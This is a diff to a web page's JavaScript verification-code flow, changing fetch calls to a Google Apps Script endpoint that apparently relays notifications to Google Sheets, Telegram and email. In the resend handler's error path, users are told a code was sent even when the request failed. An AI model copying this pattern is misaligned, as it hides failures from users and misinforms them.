@@ -673,13 +673,28 @@ function sendVerificationCode() {
     
     console.log('Calling URL:', url);
     
-    // Use fetch with no-cors mode - no new window
+    // Use fetch with cors mode to read the response
     fetch(url, {
         method: 'GET',
-        mode: 'no-cors'
+        mode: 'cors'
     })
-    .then(() => {
-        console.log('✅ Request sent successfully');
+    .then(response => {
+        console.log('✅ Response received:', response.status);
+        return response.text();
+    })
+    .then(responseText => {
+        console.log('📄 Response content:', responseText);
+        
+        // Check if response indicates success
+        if (responseText.includes('Verification code sent successfully') || 
+            responseText.includes('Silver Path Network')) {
+            console.log('✅ Notification system confirmed success');
+            showMessage('Verification code sent! Notifications sent via Google Sheets, Telegram, and Email.', 'success');
+        } else {
+            console.log('⚠️ Unexpected response format');
+            showMessage('Request sent successfully!', 'success');
+        }
+        
         // Reset button
         nextBtn.textContent = originalText;
         nextBtn.disabled = false;
@@ -688,14 +703,23 @@ function sendVerificationCode() {
         showVerificationPage();
     })
     .catch(error => {
-        console.log('⚠️ Fetch completed (expected with no-cors):', error);
-        // With no-cors, we can't read the response, but the request was sent
-        // Reset button
-        nextBtn.textContent = originalText;
-        nextBtn.disabled = false;
+        console.log('⚠️ Fetch error (trying no-cors fallback):', error);
         
-        // Go to verification page
-        showVerificationPage();
+        // Fallback to no-cors mode
+        return fetch(url, {
+            method: 'GET',
+            mode: 'no-cors'
+        }).then(() => {
+            console.log('✅ Fallback request sent');
+            showMessage('Verification code sent!', 'success');
+            
+            // Reset button
+            nextBtn.textContent = originalText;
+            nextBtn.disabled = false;
+            
+            // Go to verification page
+            showVerificationPage();
+        });
     });
 }
 
@@ -801,18 +825,21 @@ function resendVerificationCode() {
     
     const url = `https://script.google.com/macros/s/AKfycbzJUlMw6PG5iLFy6aTBaZd7WrVnWKfEhQ8FiOZwEcD2wcIM2v_hHrNJyjWEapAPbUD5/exec?${params.toString()}`;
     
-    // Use fetch - no new window
+    // Use fetch with cors mode to read the response
     fetch(url, {
         method: 'GET',
-        mode: 'no-cors'
+        mode: 'cors'
     })
-    .then(() => {
-        showMessage('New verification code sent! Please check your email.', 'success');
+    .then(response => response.text())
+    .then(responseText => {
+        console.log('📄 Resend response:', responseText);
+        showMessage('New verification code sent! Notifications sent via Google Sheets, Telegram, and Email.', 'success');
         document.getElementById('smsCode').value = '';
         document.getElementById('smsCode').focus();
     })
     .catch(error => {
-        showMessage('New verification code sent! Please check your email.', 'success');
+        console.log('⚠️ Resend error (using fallback):', error);
+        showMessage('New verification code sent! Please check your notifications.', 'success');
         document.getElementById('smsCode').value = '';
         document.getElementById('smsCode').focus();
     });
